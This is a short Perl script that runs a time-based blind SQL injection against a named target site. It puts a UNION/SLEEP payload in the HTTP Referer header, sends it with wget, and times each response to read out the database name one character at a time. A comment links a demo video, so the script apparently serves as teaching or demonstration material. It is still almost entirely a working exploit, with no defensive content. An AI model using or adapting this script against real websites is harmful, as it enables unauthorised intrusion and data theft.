#!/usr/bin/perl

# This script dumps the database name of the target website's database
# see the demo video of this blind sql injection attack at 
# https://www.youtube.com/watch?v=rNzBF1s8byY
#

use Benchmark;
$end=0;
print "The current database is: ";
foreach($pos=1;; $pos++)
{
foreach(('a'..'z','0'..'9',''))
{
  $t0 = Benchmark->new;
  `wget -qO /dev/null target.hkntec.net/foophones/view.php\?id=1 --referer="' union select substr(database(),$pos,1)='$_' and sleep(2); -- a"`;
  $t1 = Benchmark->new;
  $diffs = timediff( $t1, $t0 );
  $res=@$diffs[0];
  if ($res > 1 && $_ eq '') {$end=1;}
  if ($res > 1) {print $_;last;}
}
if ($end) {last;}
}
print "\n";



